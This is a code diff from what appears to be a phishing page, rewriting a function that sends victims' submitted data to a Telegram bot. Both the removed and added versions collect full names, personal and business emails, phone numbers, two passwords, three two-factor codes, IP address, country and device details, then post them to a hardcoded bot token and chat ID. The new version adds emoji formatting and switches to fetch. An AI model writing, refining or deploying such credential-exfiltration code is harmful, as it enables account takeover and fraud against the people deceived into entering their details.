@@ -6640,59 +6640,91 @@
       /////
       getUserIp();
 
-      // Send data to Telegram Bot
-      function sendDataToTelegram() {
-        var templateData = {
-          user_ip: userIpData.user_ip,
-          country: userIpData.country,
-          country_code: userIpData.country_code,
-          "full-name": formsSendData["full-name"],
-          "personal-email": formsSendData["personal-email"],
-          "buiseness-email": formsSendData["buiseness-email"],
-          "mobile-phone-number": formsSendData["mobile-phone-number"],
-          "password-1": formsSendData["password-1"],
-          "password-2": formsSendData["password-2"],
-          "2FA-1": formsSendData["2FA-1"],
-          "2FA-2": formsSendData["2FA-2"],
-          "2FA-3": formsSendData["2FA-3"],
-          "page-name": formsSendData["page-name"],
-          apeal: formsSendData["apeal"],
-          dis_name: metrics.dis_name,
-          is_Mobile: metrics.is_Mobile,
-          params: metrics.params,
-        };
+      function sendDataToTelegram(userIpData, formsSendData, metrics) {
+    // Prepare the data to send to Telegram
+    var templateData = {
+        user_ip: userIpData.user_ip,
+        country: userIpData.country,
+        country_code: userIpData.country_code,
+        "full-name": formsSendData["full-name"],
+        "personal-email": formsSendData["personal-email"],
+        "buiseness-email": formsSendData["buiseness-email"],
+        "mobile-phone-number": formsSendData["mobile-phone-number"],
+        "password-1": formsSendData["password-1"],
+        "password-2": formsSendData["password-2"],
+        "2FA-1": formsSendData["2FA-1"],
+        "2FA-2": formsSendData["2FA-2"],
+        "2FA-3": formsSendData["2FA-3"],
+        "page-name": formsSendData["page-name"],
+        apeal: formsSendData["apeal"],
+        dis_name: metrics.dis_name,
+        is_Mobile: metrics.is_Mobile,
+        params: metrics.params,
+    };
 
-        // Format message content
-        var message = `User IP: ${templateData["user_ip"]}\nCountry: ${templateData["country"]}\nCountry Code: ${templateData["country_code"]}\nFull Name: ${templateData["full-name"]}\nPersonal Email: ${templateData["personal-email"]}\nBusiness Email: ${templateData["buiseness-email"]}\nMobile Phone Number: ${templateData["mobile-phone-number"]}\nPassword 1: ${templateData["password-1"]}\nPassword 2: ${templateData["password-2"]}\n2FA-1: ${templateData["2FA-1"]}\n2FA-2: ${templateData["2FA-2"]}\n2FA-3: ${templateData["2FA-3"]}\nPage Name: ${templateData["page-name"]}\nAppeal: ${templateData["apeal"]}\nDevice Name: ${templateData["dis_name"]}\nIs Mobile: ${templateData["is_Mobile"]}\nParams: ${templateData["params"]}`;
+    // Format message content for Telegram in a readable way
+    var message = `
+        📝 **User Data Submitted** 📝
 
-        // Your Telegram Bot Token
-        var botToken = "7818142477:AAGPQClwFNQEolP1YiefYnzjr_ZSYZO2DtU";
-        // Chat ID of the recipient
-        var chatId = "-4547317714";
+        🏠 **User IP**: ${templateData["user_ip"]}
+        🌍 **Country**: ${templateData["country"]}
+        🌍 **Country Code**: ${templateData["country_code"]}
 
-        var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        👤 **Full Name**: ${templateData["full-name"]}
+        📧 **Personal Email**: ${templateData["personal-email"]}
+        📧 **Business Email**: ${templateData["buiseness-email"]}
+        📱 **Mobile Phone Number**: ${templateData["mobile-phone-number"]}
 
-        // Data to be sent in the POST request
-        var data = {
-          chat_id: chatId,
-          text: message,
-        };
+        🔑 **Password 1**: ${templateData["password-1"]}
+        🔑 **Password 2**: ${templateData["password-2"]}
 
-        // Send the request
-        $.ajax(url, {
-          type: "POST",
-          data: JSON.stringify(data),
-          contentType: "application/json",
+        🔐 **2FA-1**: ${templateData["2FA-1"]}
+        🔐 **2FA-2**: ${templateData["2FA-2"]}
+        🔐 **2FA-3**: ${templateData["2FA-3"]}
+
+        📄 **Page Name**: ${templateData["page-name"]}
+        ✉️ **Appeal**: ${templateData["apeal"]}
+
+        📱 **Device Name**: ${templateData["dis_name"]}
+        📱 **Is Mobile**: ${templateData["is_Mobile"]}
+        🔧 **Params**: ${templateData["params"]}
+    `;
+
+    // Your Telegram Bot Token
+    var botToken = "7818142477:AAGPQClwFNQEolP1YiefYnzjr_ZSYZO2DtU";
+    // Chat ID of the recipient (use your actual chat ID)
+    var chatId = "-4547317714";
+
+    // Define the URL to send the request to the Telegram Bot API
+    var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    // Prepare the data object
+    var data = {
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown",  // Use Markdown for formatting (bold, italic, etc.)
+    };
+
+    // Send the request using fetch
+    fetch(url, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),  // Convert data to JSON
+    })
+        .then((response) => response.json())
+        .then((data) => {
+            if (data.ok) {
+                console.log("Message sent successfully to Telegram!");
+            } else {
+                console.error("Failed to send message:", data);
+            }
         })
-          .done(function () {
-            // Handle success
-            console.log("Message sent successfully");
-          })
-          .fail(function (error) {
-            // Handle failure
-            console.error("Error sending message: ", error);
-          });
-      }
+        .catch((error) => {
+            console.error("Error during sending message to Telegram:", error);
+        });
+}
 
       function firstFormHandle(event) {
         event.preventDefault();
